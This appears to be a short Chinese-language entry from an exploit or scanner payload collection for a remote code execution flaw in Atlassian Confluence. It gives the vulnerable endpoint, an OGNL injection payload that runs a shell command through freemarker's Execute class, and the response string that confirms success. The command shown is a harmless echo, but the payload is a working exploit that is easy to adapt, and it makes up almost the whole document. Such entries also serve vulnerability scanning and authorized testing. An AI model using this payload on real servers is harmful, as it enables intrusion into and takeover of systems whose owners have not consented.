# AtlassianConfluence远程代码执行漏洞

AtlassianConfluence ｜ 命令执行 ｜ —
- **请求**：`POST /template/aui/text-inline.vm HTTP/1.1`

**Payload**
```
label=aaa\u0027%2b#request.get(\u0027.KEY_velocity.struts2.context\u0027).internalGet(\u0027ognl\u0027).findValue(#parameters.poc[0],{})%2b\u0027&poc=@org.apache.struts2.ServletActionContext@getResponse().setHeader('Cmd-Ret',(new+freemarker.template.utility.Execute()).exec({"echo 'dudesite'"}))
```
- **响应特征**：200 dudesite